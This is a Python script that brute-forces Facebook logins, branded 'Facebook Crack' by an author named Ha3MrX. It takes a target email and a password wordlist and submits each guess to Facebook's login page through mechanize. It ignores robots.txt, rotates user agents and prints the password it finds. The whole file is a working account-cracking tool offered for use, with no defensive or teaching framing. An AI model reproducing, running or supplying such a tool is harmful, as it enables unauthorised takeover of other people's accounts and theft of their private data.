import mechanize
import random
import http.cookiejar

email = input("Enter the Facebook Username (or) Email (or) Phone Number: ")
passwordlist = input("Enter the wordlist name and path: ")
login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1",
    )
]


def brute(password, br):
    print("\r[*] Trying ..... {}".format(password))
    br.addheaders = [("User-agent", random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form["email"] = email
    br.form["pass"] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and "login_attempt" not in log:
        print("\n\n[+] Password Found = {}".format(password))
        input("ANY KEY to Exit....")
        exit(1)


def search(br):
    global password
    with open(passwordlist, "r") as passwords:
        for password in passwords:
            password = password.replace("\n", "")
            brute(password, br)


def welcome():
    wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author: Ha3MrX              |
        |	       Version 1.0                |
        |   https://www.youtube.com/c/HA-MRX      |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
    """
    with open(passwordlist, "r") as total:
        total = total.readlines()
        print(wel)
        print(" [*] Account to crack:", email)
        print(" [*] Loaded:", len(total), "passwords")
        print(" [*] Cracking, please wait ...\n\n")


def main():
    br = mechanize.Browser()
    cj = http.cookiejar.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    welcome()
    search(br)
    print("Password does not exist in the wordlist")


if __name__ == "__main__":
    main()
